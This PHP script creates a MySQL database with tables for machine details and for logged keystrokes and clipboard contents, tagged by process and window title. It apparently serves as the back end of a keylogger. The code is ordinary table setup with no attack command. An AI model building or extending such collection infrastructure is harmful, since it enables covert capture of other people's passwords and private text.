<?php
$query = "CREATE DATABASE IF NOT EXISTS lrc";
$GLOBALS['DB'] ->query($query);

$query = "CREATE TABLE IF NOT EXISTS users(
          id INT(11) NOT NULL AUTO_INCREMENT,
          shaId VARCHAR(64) DEFAULT NULL,
          CPU VARCHAR(255) DEFAULT NULL,
          RAM VARCHAR(255) DEFAULT NULL,
          OS VARCHAR(255) DEFAULT NULL,
          speed VARCHAR(255) DEFAULT NULL,
          PRIMARY KEY (id),
          UNIQUE INDEX shaId (shaId)
      )
      DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci
      ENGINE = INNODB";

$GLOBALS['DB'] ->query($query);

$query ="
    CREATE TABLE IF NOT EXISTS keyboard(
      id INT(11) NOT NULL AUTO_INCREMENT,
      userId INT(11) NOT NULL,
      process VARCHAR(255) DEFAULT NULL,
      title VARCHAR(255) DEFAULT NULL,
      text LONGTEXT DEFAULT NULL,
      eventTime TIMESTAMP,
      FOREIGN KEY (userId) REFERENCES users (id),
      PRIMARY KEY (id),
      INDEX userId (userId)
    )
    DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci
    ENGINE = INNODB";

$GLOBALS['DB'] ->query($query);

$query ="
    CREATE TABLE IF NOT EXISTS clipboard(
      id INT(11) NOT NULL AUTO_INCREMENT,
      userId INT(11) NOT NULL,
      process VARCHAR(255) DEFAULT NULL,
      title VARCHAR(255) DEFAULT NULL,
      text LONGTEXT DEFAULT NULL,
      eventTime TIMESTAMP,
      FOREIGN KEY (userId) REFERENCES users (id),
      PRIMARY KEY (id),
      INDEX userId (userId)
    )
    DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci
    ENGINE = INNODB";

$GLOBALS['DB'] ->query($query);
?>

